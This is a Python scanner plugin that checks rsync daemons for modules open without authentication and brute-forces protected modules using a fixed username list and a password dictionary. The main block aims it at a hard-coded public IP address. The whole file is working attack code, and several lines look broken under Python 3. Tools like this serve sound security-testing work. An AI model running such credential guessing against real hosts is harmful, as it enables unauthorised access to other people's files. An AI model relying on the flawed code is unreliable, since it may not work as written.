# coding:utf-8

import socket
import re
import time
import hashlib
from itertools import product
from base64 import b64encode
from exp.lib.gla import getpassdict
import codecs

decode_hex = codecs.getdecoder('hex_codec')

def hex2bin(x):
    return bytes.fromhex(x)

ver_num_com = re.compile('@RSYNCD: (\d+)')

class ReqNoUnderstandError(Exception):
    pass

class VersionNotSuppError(Exception):
    pass

class RsyncWeakCheck(object):

    _list_request = hex2bin('0a')

    _hello_request = '@RSYNCD: 31\n'

    def __init__(self, host='', port=0, timeout=10):
        super(RsyncWeakCheck, self).__init__()
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock = None


    def _rsync_init(self):
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        socket.setdefaulttimeout(self.timeout)
        sock.connect((self.host,self.port))
        asdad = bytes(self._hello_request, 'utf-8')
        sock.send(asdad)
        res = sock.recv(1024)
        self.sock = sock
        return res


    def is_path_not_auth(self, path_name = ''):
        self._rsync_init()
        payload = path_name + '\n'
        asddd = bytes(payload, 'utf-8')
        self.sock.send(asddd)
        result = self.sock.recv(1024)
        if result == '\n':
            result = self.sock.recv(1024)
        if result.startswith(b'@RSYNCD: OK'):
            return 0
        if result.startswith(b'@RSYNCD: AUTHREQD'):
            return 1
        if b'@ERROR: chdir failed' in result:
            return -1
        else:
            raise ReqNoUnderstandError()


    def get_all_pathname(self):
        self._rsync_init()
        self.sock.send(self._list_request)
        time.sleep(0.5)
        result = self.sock.recv(1024)
        if result:
            result = result.decode()
            for path_name in re.split('\n', result):
                if path_name and not path_name.startswith('@RSYNCD: '):
                    yield path_name.split('\t')[0].strip()

    def weak_passwd_check(self, path_name='', username='', passwd=''):
        ver_string = self._rsync_init()
        if self._get_ver_num(ver_string=ver_string) < 30:
            raise VersionNotSuppError()
        payload = path_name + '\n'
        gxzz = bytes(payload, 'utf-8')
        self.sock.send(gxzz)
        result = self.sock.recv(1024)
        if result == '\n':
            result = self.sock.recv(1024)
        if result:
            hash_o = hashlib.md5()
            hash_o.update(passwd)
            hash_o.update(result[18:].rstrip('\n'))
            auth_string = b64encode(hash_o.digest())
            send_data = username + ' ' + auth_string.rstrip('==') + '\n'
            self.sock.send(send_data)
            res = self.sock.recv(1024)
            if res.startswith(b'@RSYNCD: OK'):
                return (True, username, passwd)
            else:
                return False


    def _get_ver_num(self, ver_string=''):
        if ver_string:
            ver_num = ver_num_com.match(ver_string).group(1)
            if ver_num.isdigit():
                return int(ver_num)
            else: return 0
        else:
            return 0

def verify(protocol,ip,port):
    url = ip+':'+str(port)
    print('testing if rsync unauth vul and weak pass vul')
    info = ''
    not_unauth_list = []
    weak_auth_list = []
    userlist = ['test', 'root', 'www', 'zte', 'rsync', 'admin']
    timeout = 15
    if __name__ == '__main__':
        psw = ['test', 'neagrle']
    else:
        passdictarr = getpassdict()
        psw = passdictarr.get_pass_dict()
    try:
        rwc = RsyncWeakCheck(ip,int(port))
        for path_name in rwc.get_all_pathname():
            ret = rwc.is_path_not_auth(path_name)
            if ret == 0:
                not_unauth_list.append(path_name)
            elif ret == 1:
                for username, passwd in product(userlist, psw):
                    try:
                        res = rwc.weak_passwd_check(path_name, username, passwd)
                        if res:
                            weak_auth_list.append((path_name, username, passwd))
                    except VersionNotSuppError as e:
                        pass
    except Exception as e:
        errorinfo = str(e)
        print(errorinfo)

    if not_unauth_list:
        info += 'There are unauth dictionary:%s;' %','.join(not_unauth_list)
    if weak_auth_list:
        for weak_auth in weak_auth_list:
            info += 'There are dictionary %s with weak pass :%s:%s;' %weak_auth
    if info:
        msg = 'There is rsync unauth  or weak pass vul on url: ' +url+' . There vul info is: '+info+' .'
        print(msg)
        number = 'v86'
        return True,url,number,msg
    else:
        pass
    msg = 'There is no rsync unauth or weak pass vul'
    number = 'v0'
    return False,url,number,msg

if __name__ == '__main__':
    res = verify('http','45.76.250.67',873)
    print(res)